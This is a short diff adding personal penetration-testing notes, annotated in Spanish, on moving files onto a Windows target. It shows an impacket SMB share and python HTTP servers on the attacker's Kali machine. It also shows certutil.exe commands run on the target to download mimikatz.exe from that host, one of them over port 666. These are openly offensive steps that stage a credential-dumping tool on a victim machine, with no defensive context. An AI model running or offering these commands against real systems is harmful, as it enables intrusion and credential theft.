@@ -1,0 +1,20 @@
+
+        port 445   smb   windows
+
+::: impacket-smbserver smbFolder_mango $(pwd) -smb2support
+
+target:: copy \\ipKaliMAIN\smbFolder_mango\archivoHere.omo .
+
+
+
+
+
+
+
+
+::: python3 -m http.server 80
+
+target:: certutil.exe -f -urlcache -split http://ipKali/mimikatz.exe
+
+::: python3 -m http.server 666
+target:: certutil.exe -f -urlcache -split http://ipKali:666/mimikatz.exe    <<-- incluyeElPuerto enUrl
